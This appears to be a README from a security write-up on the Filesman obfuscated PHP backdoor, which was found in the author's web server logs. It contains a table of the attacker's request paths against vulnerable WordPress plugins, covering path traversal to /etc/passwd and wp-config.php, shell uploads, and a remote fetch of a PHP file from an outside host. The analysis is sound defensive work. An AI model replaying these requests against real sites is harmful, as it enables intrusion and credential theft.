# Obfuscated PHP backdoor
This came into my logs, and I had to Deobfuscate it to see what it was doing. It was very tedious because I still have to figure out how to automate that process... Stay tuned for that eventually.

## Description
This backdoor is called the "Filesman" PHP backdoor, and leverages vulnerable Wordpress plugins. It was uploaded to my server from a GET request.

When I analyzed the log, I was surprised to find Binary files and other huge Body requests from this one IP address: 175.138.65.218

Also provided by this IP address is a helpful map of resources they were trying to enumerate.


| Number of Requests | Resource Requested |
|---|---------|
| 9 | / |
| 3 | /robots.txt |
| 3 | /wp-admin/admin-ajax.php |
| 3 | /wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php |
| 3 | /wp-content/plugins/candidate-application-form/downloadpdffile.php?fileName=../../../../../../../../../../etc/passwd |
| 3 | /wp-content/plugins/formcraft/file-upload/server/php/upload.php |
| 3 | /wp-content/plugins/recent-backups/download-file.php?file_link=/etc/passwd |
| 3 | /wp-content/plugins/revslider/temp/update_extract/revslider/db.php |
| 3 | /wp-content/plugins/simple-ads-manager/js/slider/tmpl.js |
| 3 | /wp-content/plugins/./simple-image-manipulator/controller/download.php?filepath=/etc/passwd |
| 3 | /wp-content/plugins/wp-ecommerce-shop-styling/includes/download.php?filename=../../../../../../../../../etc/passwd |
| 3 | /wp-content/plugins/wp-mobile-detector/cache/db.php |
| 3 | /wp-content/plugins/wp-mobile-detector/resize.php?src=http://www.relationshiptips.club/cache/db.php |
| 1 | /wp-content/plugins/wp-symposium/server/php/beyOrGgEAZBDHF.php |
| 1 | /wp-content/plugins/wp-symposium/server/php/eYXoORjxZzYOaf.php |
| 3 | /wp-content/plugins/wp-symposium/server/php/index.php |
| 1 | /wp-content/plugins/wp-symposium/server/php/vocqioANdBslXr.php |
| 3 | /wp-content/plugins/wptf-image-gallery/lib-mbox/ajax_load.php?url=/etc/passwd |
| 3 | /wp-content/themes/mTheme-Unus/css/css.php?files=../../../../wp-config.php |
| 3 | /xmlrpc.php?rsd |

## See Also:
[Manually Deobfuscate FOPO php](https://www.youtube.com/watch?v=y3s48uD7bG8)
[PHP Backdoor Obfuscation Techniques](https://vexatioustendencies.com/php-backdoor-obfuscation-techniques/)
[Convert Unicode Characters](https://r12a.github.io/apps/conversion/)
